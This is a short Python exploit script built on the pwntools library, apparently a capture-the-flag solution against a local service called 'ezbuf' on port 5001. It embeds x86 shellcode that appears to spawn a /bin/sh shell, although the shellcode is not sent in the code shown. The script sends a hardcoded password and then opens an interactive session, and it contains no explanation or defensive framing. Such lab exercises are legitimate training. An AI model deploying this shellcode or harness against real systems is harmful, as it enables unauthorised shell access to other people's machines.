#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from struct import pack, unpack

#MAGIC_VALUE_1 = 0x475a31a5
#MAGIC_VALUE_2 = 0x40501555

shellcode="\x90\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80"
#shellcode = "\x90\x90\x90\x90\x90"

conn = remote("localhost", 5001) 
#conn = remote("192.168.40.51", 5001) 
#conn = process("./ezbuf")
#conn.recvuntil("Password: ")
recieved = conn.recvuntil(": ")
log.info("Recieved: " + recieved)
answer = "c4shm0n3y"
log.info("Sending answer")
conn.sendline(answer)
#print conn.recv()
conn.interactive()
